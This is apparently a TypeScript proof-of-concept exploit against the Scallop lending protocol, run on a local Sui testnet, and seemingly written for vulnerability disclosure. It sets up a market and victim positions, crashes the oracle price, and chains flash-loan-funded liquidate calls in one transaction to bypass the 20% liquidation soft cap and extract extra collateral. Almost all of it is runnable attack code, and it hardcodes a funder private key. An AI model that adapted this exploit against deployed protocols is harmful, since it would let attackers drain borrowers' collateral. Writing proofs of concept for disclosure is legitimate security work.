// @ts-nocheck
/**
 * PoC: Multi-Call Liquidation Bypasses 20% Soft Cap
 * Target: Scallop Protocol (Local Testnet)
 * FINAL VERSION: All fixes applied
 */

import { SuiClient } from '@mysten/sui/client';
import { Transaction } from '@mysten/sui/transactions';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';

const client = new SuiClient({ url: 'http://127.0.0.1:9000' });

// ==================== KONFIGURASI LOCAL TESTNET (ID BARU) ====================
const PKG = "0xcf2399e07c04f0f80e26030f7d75a23c9504e8c114895abd35e12aeae39f68af";
const VERSION = "0x855f1df827c49e720c224b7128fca60c7edcdbdf3e28253127d852d86ba2e2dd";
const MARKET = "0x9b71e2368abe9bdef1779023408f828de3ca52fa8048a3135e8666c60ab1152e";
const ORACLE = "0xe852c63ea9b6c5694923d5e7ec601c04b93799b814873a9d91795613b5f7de4a";
const REGISTRY = "0x8ce263a23162c2d396de8783d2bcde30675d36034724fdb2748ca801c72f53a9";
const CLOCK = "0x6";

const TEST_COIN_PKG = "0xde8cbb901496e8574ed0f4feb2859c3b596721adc0742953ae75fb158bd0b135";
const USDC_TYPE = `${TEST_COIN_PKG}::usdc::USDC`;
const ETH_TYPE = `${TEST_COIN_PKG}::eth::ETH`;
const SUI_TYPE = "0x2::sui::SUI";

const USDC_TREASURY = "0x8fcda1bb3e91532dc8b20516d2fbc190fc276e0888d981413cad7c79055f4262";
const ETH_TREASURY = "0xd29bb805e9e4c4d8d6c4088dfd48cdddd34b3dbad98f40938bec9e536e2d4c1c";

const funderPrivateKeyStr = "suiprivkey1qzuxayfjwjmrqat03vkjh5nrt66fp4utywud2x8v0k0a6fg453yg7j2kcaa";
const privateKeyBytes = decodeSuiPrivateKey(funderPrivateKeyStr).secretKey;
const funderKeypair = Ed25519Keypair.fromSecretKey(privateKeyBytes);
const funderAddress = funderKeypair.getPublicKey().toSuiAddress();

console.log(`[INIT] Funder Address: ${funderAddress}`);

// ==================== HELPER FUNCTIONS ====================
async function findAdminCap(): Promise<string> {
    console.log("[INIT] Searching for AdminCap...");
    let cursor = null;
    while (true) {
        const objects = await client.getOwnedObjects({ owner: funderAddress, cursor, options: { showType: true } });
        for (const obj of objects.data) {
            if ((obj.data?.type || "").includes(`${PKG}::app::AdminCap`)) {
                console.log(`[INIT] AdminCap found: ${obj.data.objectId}`);
                return obj.data.objectId;
            }
        }
        if (!objects.hasNextPage) break;
        cursor = objects.nextCursor;
    }
    throw new Error("[INIT] AdminCap not found.");
}

async function findCoinMetadata(coinType: string): Promise<string> {
    const response = await client.getCoinMetadata({ coinType });
    if (!response) throw new Error(`CoinMetadata not found for ${coinType}`);
    return response.id;
}

async function getXOraclePackage(): Promise<string> {
    const obj = await client.getObject({ id: ORACLE, options: { showType: true } });
    const match = obj.data?.type?.match(/^(0x[0-9a-fA-F]+)::/);
    if (!match) throw new Error("Failed to parse XOracle package ID");
    return match[1];
}

async function executeTx(tx, keypair) {
    tx.setSender(keypair.getPublicKey().toSuiAddress());
    const result = await client.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
        options: { showEffects: true, showObjectChanges: true },
    });
    await new Promise(r => setTimeout(r, 1500));
    return result;
}

async function printBalances(address) {
    const sui = await client.getBalance({ owner: address, coinType: SUI_TYPE });
    const usdc = await client.getBalance({ owner: address, coinType: USDC_TYPE });
    const eth = await client.getBalance({ owner: address, coinType: ETH_TYPE });
    console.log(`[DEBUG] SUI=${Number(sui.totalBalance)/1e9} | USDC=${Number(usdc.totalBalance)/1e9} | ETH=${Number(eth.totalBalance)/1e9}`);
}

async function readObligationState(obligationId) {
    const fields = await client.getDynamicFields({ parentId: obligationId });
    let collateralAmount = 0n, debtUSDC = 0n, debtETH = 0n;
    for (const field of fields.data) {
        const fieldData = await client.getDynamicFieldObject({ parentId: obligationId, name: field.name });
        const name = JSON.stringify(field.name);
        const val = fieldData?.data?.content?.fields;
        if (name.includes("Collateral") && val) collateralAmount = BigInt(val.amount || 0);
        else if (name.includes("Debt") && val) {
            if (name.includes("USDC")) debtUSDC = BigInt(val.amount || 0);
            else if (name.includes("ETH")) debtETH = BigInt(val.amount || 0);
        }
    }
    return { collateralAmount, debtUSDC, debtETH };
}

// ==================== PHASE 0: INITIALIZE MARKET ====================
async function initializeMarket(adminCapId) {
    console.log("\n[INIT] Initializing Market (Complete Setup)...");
    
    const suiMetaId = await findCoinMetadata(SUI_TYPE);
    const usdcMetaId = await findCoinMetadata(USDC_TYPE);
    const ethMetaId = await findCoinMetadata(ETH_TYPE);

    const tx = new Transaction();

    tx.moveCall({ target: `${PKG}::app::whitelist_allow_all`, arguments: [tx.object(adminCapId), tx.object(MARKET)] });
    tx.moveCall({ target: `${PKG}::app::init_market_coin_price_table`, arguments: [tx.object(adminCapId), tx.object(MARKET)] });

    const SCALE = 10n ** 12n;

    const addInterestModel = (coinType, p) => {
        const [m] = tx.moveCall({
            target: `${PKG}::app::create_interest_model_change`,
            typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.pure.u64(p.baseBorrowRatePerSec), tx.pure.u64(p.interestRateScale), tx.pure.u64(p.borrowRateOnMidKink), tx.pure.u64(p.midKink), tx.pure.u64(p.borrowRateOnHighKink), tx.pure.u64(p.highKink), tx.pure.u64(p.maxBorrowRate), tx.pure.u64(p.revenueFactor), tx.pure.u64(p.borrowWeight), tx.pure.u64(p.scale), tx.pure.u64(p.minBorrowAmount)],
        });
        tx.moveCall({ target: `${PKG}::app::add_interest_model`, typeArguments: [coinType], arguments: [tx.object(MARKET), tx.object(adminCapId), m, tx.object(CLOCK)] });
    };

    const addRiskModel = (coinType, p) => {
        const [m] = tx.moveCall({
            target: `${PKG}::app::create_risk_model_change`,
            typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.pure.u64(p.collateralFactor), tx.pure.u64(p.liquidationFactor), tx.pure.u64(p.liquidationPanelty), tx.pure.u64(p.liquidationDiscount), tx.pure.u64(p.scale), tx.pure.u64(p.maxCollateralAmount)],
        });
        tx.moveCall({ target: `${PKG}::app::add_risk_model`, typeArguments: [coinType], arguments: [tx.object(MARKET), tx.object(adminCapId), m] });
    };

    const addLimiter = (coinType, limit, cycle, segment) => {
        tx.moveCall({ target: `${PKG}::app::add_limiter`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit), tx.pure.u32(cycle), tx.pure.u32(segment)] });
    };

    const registerDecimals = (coinType, metadataId) => {
        tx.moveCall({ target: `${PKG}::coin_decimals_registry::register_decimals`, typeArguments: [coinType], arguments: [tx.object(REGISTRY), tx.object(metadataId)] });
    };

    const setMinCollateral = (coinType, amount) => {
        tx.moveCall({ target: `${PKG}::app::update_min_collateral_amount`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(amount)] });
    };

    const setSupplyLimit = (coinType, limit) => {
        tx.moveCall({ target: `${PKG}::app::update_supply_limit`, typeArguments: [coinType], arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit)] });
    };

    // FIX: Mencegah borrow_child_object abort pada borrow::borrow
    const setBorrowLimit = (coinType, limit) => {
        tx.moveCall({
            target: `${PKG}::app::update_borrow_limit`,
            typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(limit)],
        });
    };

    const setBorrowFee = (coinType, numerator, denominator) => {
        tx.moveCall({
            target: `${PKG}::app::update_borrow_fee`,
            typeArguments: [coinType],
            arguments: [tx.object(adminCapId), tx.object(MARKET), tx.pure.u64(numerator), tx.pure.u64(denominator)],
        });
    };

    const setupCoin = (coinType, metaId, interestParams, riskParams) => {
        registerDecimals(coinType, metaId);
        addInterestModel(coinType, interestParams);
        addRiskModel(coinType, riskParams);
        addLimiter(coinType, 10n ** 15n, 86400, 1800);
        setMinCollateral(coinType, 0n);
        setSupplyLimit(coinType, 10n ** 18n);
        setBorrowLimit(coinType, 10n ** 18n);
        setBorrowFee(coinType, 0n, 1n);
    };

    const interestSUI = { baseBorrowRatePerSec: 0n, interestRateScale: 10n**7n, borrowRateOnMidKink: 10n*(SCALE/100n), midKink: 60n*(SCALE/100n), borrowRateOnHighKink: 100n*(SCALE/100n), highKink: 90n*(SCALE/100n), maxBorrowRate: 300n*(SCALE/100n), revenueFactor: 5n*(SCALE/100n), borrowWeight: 125n*(SCALE/100n), scale: SCALE, minBorrowAmount: 10n**7n };
    const interestUSDC = { ...interestSUI, borrowRateOnMidKink: 8n*(SCALE/100n), borrowRateOnHighKink: 50n*(SCALE/100n), maxBorrowRate: 150n*(SCALE/100n), borrowWeight: 100n*(SCALE/100n) };
    const interestETH = { ...interestSUI, borrowWeight: 100n*(SCALE/100n) };

    setupCoin(SUI_TYPE, suiMetaId, interestSUI, { collateralFactor: 60n, liquidationFactor: 70n, liquidationPanelty: 10n, liquidationDiscount: 7n, scale: 100n, maxCollateralAmount: 10n**17n });
    setupCoin(USDC_TYPE, usdcMetaId, interestUSDC, { collateralFactor: 90n, liquidationFactor: 95n, liquidationPanelty: 3n, liquidationDiscount: 2n, scale: 100n, maxCollateralAmount: 10n**17n });
    setupCoin(ETH_TYPE, ethMetaId, interestETH, { collateralFactor: 80n, liquidationFactor: 90n, liquidationPanelty: 8n, liquidationDiscount: 5n, scale: 100n, maxCollateralAmount: 10n**16n });

    await executeTx(tx, funderKeypair);
    console.log("[INIT] Market initialized successfully (with borrow limits & fees)!");
}

// ==================== PHASE 1: SETUP VICTIM ====================
async function setupVictim(victimKeypair, label, adminCapId, xOraclePkg) {
    const victimAddr = victimKeypair.getPublicKey().toSuiAddress();
    console.log(`\n[${label}] Setting up victim at ${victimAddr}...`);

    const fundTx = new Transaction();
    const [suiCoin] = fundTx.splitCoins(fundTx.gas, [1_010_000_000_000n]);
    fundTx.transferObjects([suiCoin], victimAddr);
    await executeTx(fundTx, funderKeypair);
    console.log(`[${label}] Step 1 done: Funded 1010 SUI`);

    const openTx = new Transaction();
    openTx.moveCall({ target: `${PKG}::open_obligation::open_obligation_entry`, arguments: [openTx.object(VERSION)] });
    const openResult = await executeTx(openTx, victimKeypair);

    let obligationId = "", obligationKeyId = "";
    for (const obj of openResult.objectChanges || []) {
        if (obj.type === "created" && obj.objectType?.includes("obligation::ObligationKey")) obligationKeyId = obj.objectId;
        else if (obj.type === "created" && obj.objectType?.includes("obligation::Obligation")) obligationId = obj.objectId;
    }
    if (!obligationId || !obligationKeyId) throw new Error(`[${label}] Failed to parse obligationId or obligationKeyId.`);
    console.log(`[${label}] Obligation: ${obligationId}, Key: ${obligationKeyId}`);

    const wlTx = new Transaction();
    wlTx.moveCall({ target: `${PKG}::app::add_whitelist_address`, arguments: [wlTx.object(adminCapId), wlTx.object(MARKET), wlTx.pure.address(victimAddr)] });
    await executeTx(wlTx, funderKeypair);

    const depTx = new Transaction();
    const [coll] = depTx.splitCoins(depTx.gas, [1_000_000_000_000n]);
    depTx.moveCall({ target: `${PKG}::deposit_collateral::deposit_collateral`, typeArguments: [SUI_TYPE], arguments: [depTx.object(VERSION), depTx.object(obligationId), depTx.object(MARKET), coll] });
    await executeTx(depTx, victimKeypair);
    console.log(`[${label}] Step 3 done: Deposited 1000 SUI`);

    const supTx = new Transaction();
    const [usdcC] = supTx.moveCall({ target: `${TEST_COIN_PKG}::usdc::mint`, arguments: [supTx.object(USDC_TREASURY), supTx.pure.u64(100_000_000_000_000n)] });
    const [sUSDC] = supTx.moveCall({ target: `${PKG}::mint::mint`, typeArguments: [USDC_TYPE], arguments: [supTx.object(VERSION), supTx.object(MARKET), usdcC, supTx.object(CLOCK)] });
    supTx.transferObjects([sUSDC], funderAddress);

    const [ethC] = supTx.moveCall({ target: `${TEST_COIN_PKG}::eth::mint`, arguments: [supTx.object(ETH_TREASURY), supTx.pure.u64(10_000_000_000n)] });
    const [sETH] = supTx.moveCall({ target: `${PKG}::mint::mint`, typeArguments: [ETH_TYPE], arguments: [supTx.object(VERSION), supTx.object(MARKET), ethC, supTx.object(CLOCK)] });
    supTx.transferObjects([sETH], funderAddress);
    await executeTx(supTx, funderKeypair);
    console.log(`[${label}] Step 4 done: Supplied USDC & ETH to market`);

    const prTx = new Transaction();
    prTx.moveCall({ target: `${xOraclePkg}::x_oracle::update_price`, typeArguments: [SUI_TYPE], arguments: [prTx.object(ORACLE), prTx.object(CLOCK), prTx.pure.u64(100_000_000n)] });
    prTx.moveCall({ target: `${xOraclePkg}::x_oracle::update_price`, typeArguments: [USDC_TYPE], arguments: [prTx.object(ORACLE), prTx.object(CLOCK), prTx.pure.u64(100_000_000n)] });
    prTx.moveCall({ target: `${xOraclePkg}::x_oracle::update_price`, typeArguments: [ETH_TYPE], arguments: [prTx.object(ORACLE), prTx.object(CLOCK), prTx.pure.u64(200_000_000_000n)] });
    await executeTx(prTx, funderKeypair);
    console.log(`[${label}] Step 4.5 done: Oracle prices set (SUI=$1, USDC=$1, ETH=$2000)`);

    const b1 = new Transaction();
    const [bUSDC] = b1.moveCall({ target: `${PKG}::borrow::borrow`, typeArguments: [USDC_TYPE], arguments: [b1.object(VERSION), b1.object(obligationId), b1.object(obligationKeyId), b1.object(MARKET), b1.object(REGISTRY), b1.pure.u64(500_000_000n), b1.object(ORACLE), b1.object(CLOCK)] });
    b1.transferObjects([bUSDC], victimAddr);
    await executeTx(b1, victimKeypair);
    console.log(`[${label}] Step 5 done: Borrowed 500 USDC`);

    const b2 = new Transaction();
    const [bETH] = b2.moveCall({ target: `${PKG}::borrow::borrow`, typeArguments: [ETH_TYPE], arguments: [b2.object(VERSION), b2.object(obligationId), b2.object(obligationKeyId), b2.object(MARKET), b2.object(REGISTRY), b2.pure.u64(200_000_000n), b2.object(ORACLE), b2.object(CLOCK)] });
    b2.transferObjects([bETH], victimAddr);
    await executeTx(b2, victimKeypair);
    console.log(`[${label}] Step 6 done: Borrowed 0.2 ETH`);

    return { obligationId, obligationKeyId };
}

// ==================== PHASE 2-4: Exploit ====================
async function crashOraclePrice(xOraclePkg) {
    console.log("\n[TRIGGER] Crashing SUI price to $0.40...");
    const tx = new Transaction();
    tx.moveCall({ target: `${xOraclePkg}::x_oracle::update_price`, typeArguments: [SUI_TYPE], arguments: [tx.object(ORACLE), tx.object(CLOCK), tx.pure.u64(40_000_000n)] });
    await executeTx(tx, funderKeypair);
    console.log("[TRIGGER] SUI crashed. Victims UNHEALTHY!");
}

async function beforeExploit_singleCall(obligationId) {
    console.log("\n" + "=".repeat(60) + "\nBEFORE EXPLOIT: Single Liquidation Call\n" + "=".repeat(60));
    const s1 = await readObligationState(obligationId);
    console.log(`[BEFORE] Collateral: ${s1.collateralAmount} SUI`);

    const tx = new Transaction();
    const [fUSDC, rUSDC] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)] });
    const [rem, coll] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(obligationId), tx.object(MARKET), fUSDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
    tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), rem, rUSDC] });
    tx.transferObjects([coll], funderAddress);
    await executeTx(tx, funderKeypair);

    const s2 = await readObligationState(obligationId);
    const extracted = s1.collateralAmount - s2.collateralAmount;
    console.log(`[BEFORE] Extracted: ${extracted} SUI (~20% cap)`);
    return { extracted };
}

async function afterExploit_multiCall(obligationId) {
    console.log("\n" + "=".repeat(60) + "\nAFTER EXPLOIT: Multi-Call Liquidation\n" + "=".repeat(60));
    const s1 = await readObligationState(obligationId);

    const tx = new Transaction();
    const [f_USDC, r_USDC] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(50_000_000_000n)] });
    const [f_ETH, r_ETH] = tx.moveCall({ target: `${PKG}::flash_loan::borrow_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), tx.pure.u64(10_000_000_000n)] });
    const [rem1, c1] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [USDC_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(obligationId), tx.object(MARKET), f_USDC, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
    const [rem2, c2] = tx.moveCall({ target: `${PKG}::liquidate::liquidate`, typeArguments: [ETH_TYPE, SUI_TYPE], arguments: [tx.object(VERSION), tx.object(obligationId), tx.object(MARKET), f_ETH, tx.object(REGISTRY), tx.object(ORACLE), tx.object(CLOCK)] });
    tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [USDC_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), rem1, r_USDC] });
    tx.moveCall({ target: `${PKG}::flash_loan::repay_flash_loan`, typeArguments: [ETH_TYPE], arguments: [tx.object(VERSION), tx.object(MARKET), rem2, r_ETH] });
    tx.mergeCoins(c1, [c2]);
    tx.transferObjects([c1], funderAddress);
    await executeTx(tx, funderKeypair);

    const s2 = await readObligationState(obligationId);
    const extracted = s1.collateralAmount - s2.collateralAmount;
    console.log(`[AFTER] Extracted: ${extracted} SUI (BYPASSED 20% cap!)`);
    return { extracted };
}

// ==================== MAIN ====================
async function main() {
    console.log("╔═══════════════════════════════════════════════════════════╗");
    console.log("║  PoC: Multi-Call Liquidation Bypass (Local Testnet)       ║");
    console.log("╚═══════════════════════════════════════════════════════════╝");

    const adminCapId = await findAdminCap();
    const xOraclePkg = await getXOraclePackage();

    await initializeMarket(adminCapId);

    const victimA = Ed25519Keypair.generate();
    const victimB = Ed25519Keypair.generate();

    const vA = await setupVictim(victimA, "VICTIM A", adminCapId, xOraclePkg);
    const vB = await setupVictim(victimB, "VICTIM B", adminCapId, xOraclePkg);

    await crashOraclePrice(xOraclePkg);

    const beforeResult = await beforeExploit_singleCall(vA.obligationId);
    const afterResult = await afterExploit_multiCall(vB.obligationId);

    console.log("\n" + "=".repeat(60));
    console.log("FINAL IMPACT ANALYSIS");
    console.log("=".repeat(60));
    console.log(`Single-Call Extracted : ${beforeResult.extracted} SUI`);
    console.log(`Multi-Call Extracted  : ${afterResult.extracted} SUI`);

    if (beforeResult.extracted > 0n) {
        const ratio = Number(afterResult.extracted) / Number(beforeResult.extracted);
        console.log(`\n[IMPACT] Multi-Call extracted ${ratio.toFixed(2)}x MORE collateral!`);
    }
    console.log(`[IMPACT] 20% Soft Cap was BYPASSED via Multi-Call in single PTB!`);
}

main().catch(console.error);
